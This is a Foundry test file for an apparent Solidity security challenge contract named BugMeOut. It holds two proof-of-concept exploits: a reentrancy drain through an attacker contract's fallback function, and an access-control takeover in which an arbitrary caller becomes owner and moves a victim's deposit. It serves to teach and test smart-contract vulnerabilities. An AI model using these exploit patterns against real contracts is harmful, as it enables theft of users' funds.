// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

import "forge-std/Test.sol";
import "../../src/Challenge/BugMeOut.sol";

contract BugMeOutest is Test {
    BugMeOut public bugmeout;
    AttackerContract attack;
    address victim = vm.addr(2);
    address attacker = vm.addr(3);

    function setUp() public {
        bugmeout = new BugMeOut();
        attack = new AttackerContract(address(bugmeout));
        vm.deal(address(bugmeout), 10 ether);
        vm.deal(address(attack), 5 ether);
        vm.deal(address(victim),5 ether);
        vm.prank(victim);
        bugmeout.deposit{value: 5 ether}();
    }
    function testReentrancy() public {
        attack.Attack();
    }

    function testAccessControl() public{
        console.log("Owner of Contract before exploiataion:", bugmeout.owner());
        vm.startPrank(attacker);
        console.log("Attacker (msg.sender) Addresss:", attacker);
        console.log("================Updating the Owner by Calling UpdateOwner()================");
        bugmeout.UpdateOwner(attacker);
        console.log("Owner of Contract after exploiataion:", bugmeout.owner());
        console.log("attacker's balance before moveFunds():", bugmeout.balances(attacker));
        console.log("Victim's balance before moveFunds():", bugmeout.balances(victim));
        console.log("================Calling MoveFunds() with new owner(attacker) ================");
        bugmeout.moveFunds(victim, attacker, 5000000000000000000);
        console.log("attacker's balance after moveFunds():", bugmeout.balances(attacker));
        console.log("Victim's balance after moveFunds():", bugmeout.balances(victim));
        vm.stopPrank();
    }
}

contract AttackerContract is DSTest{
   BugMeOut bugmeout;
    constructor(address _bugmeout) public {
        bugmeout = BugMeOut(_bugmeout);
    }

    function Attack() public {   
        emit log_named_decimal_uint("Start attack, BugMeOut balance", address(bugmeout).balance, 18);
        bugmeout.deposit{value: 1 ether}();  
        emit log_named_decimal_uint("Deposited 1 Ether, BugMeOut balance", address(bugmeout).balance, 18);
        emit log_string("==================== Start of attack ====================");
        bugmeout.withdrawFunds(1 ether); 
        emit log_string("==================== End of attack ====================");
        emit log_named_decimal_uint("End of attack, BugMeOut balance:", address(bugmeout).balance, 18);
        emit log_named_decimal_uint("End of attack, BugMeOut balance:", address(this).balance, 18);
    }

    fallback() external payable {
        emit log_named_decimal_uint("BugMeOut balance", address(bugmeout).balance, 18);
        emit log_named_decimal_uint("Attacker balance", address(this).balance, 18);
        if (address(bugmeout).balance >= 1 ether) {
            emit log_string("Reenter");
            bugmeout.withdrawFunds(1 ether);
        }
    }

}

